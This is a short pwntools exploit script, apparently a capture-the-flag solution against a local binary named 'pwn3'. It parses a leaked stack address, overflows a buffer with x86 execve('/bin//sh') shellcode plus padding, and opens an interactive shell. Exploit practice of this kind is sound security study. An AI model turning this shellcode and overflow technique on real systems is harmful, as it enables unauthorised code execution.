import pwn

io = pwn.process('./pwn3')

io.recvuntil(b"journey ")
leak = io.recvline()
print(leak)
leak = leak.split(b"!")[0]
leak = int(leak, 16)
leak = leak.to_bytes(8, "little")

offset = 302

shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"    

payload = shellcode + b"0" * (offset - len(shellcode)) + leak

io.sendline(payload)
io.interactive()
